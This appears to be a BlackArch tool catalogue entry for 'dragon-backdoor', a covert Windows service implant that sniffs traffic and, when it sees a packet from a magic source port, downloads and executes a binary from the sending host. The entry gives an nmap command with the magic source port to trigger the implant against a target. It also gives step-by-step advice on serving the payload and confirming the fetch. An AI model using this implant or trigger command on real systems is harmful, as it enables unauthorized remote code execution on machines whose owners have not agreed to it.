---
name: "dragon-backdoor"
categories:
  - blackarch-backdoor
version: "7.c7416b7"
homepage: "https://github.com/Shellntel/backdoors"
packaged-by: [blackarch]
blackarch-builddate: "2018-11-12"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "Shellntel/backdoors"
github-stars: 128
github-pushed: "2015-06-12"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# dragon-backdoor

> Port-knocked Windows implant: a WinPcap-sniffing service that opens no port but, on seeing a packet from a magic source port, downloads and executes a binary from the knocking host.

*No corpus evidence — derived from upstream documentation.*

## What it's for

Covert reverse-download backdoor for Windows (tested on everything from XP to Windows 8 and Server 2003 to Server 2012), built from `dragon.c` in the Shellntel/backdoors collection and based on cd00r.c. It binds nothing and listens nowhere: installed as a Windows service, it sniffs every interface via WinPcap and waits for a single packet whose source port equals the magic value (12317 by default). When that packet appears, it fetches and executes a binary with `wget` from the packet's source IP — so the trigger is one packet and delivery is plain HTTP from the knocking host. The magic source port is hard-coded in `packet_handler()` and has to be edited in the source to change; there is no authentication, so anyone who knows the port can fire it.

## Typical use cases

### Knock the implant awake and serve it a payload

```
sudo nmap -g 12317 -p 80 -Pn target.example.com
```

Outcome: nmap emits packets with source port 12317 (`-g`); the dragon service on the target sees the magic source port in its sniffer path and uses wget to download and run a binary from your machine's IP. Have an HTTP server on the knocking host serving the payload before you send the knock, and watch that server's logs to confirm the fetch.
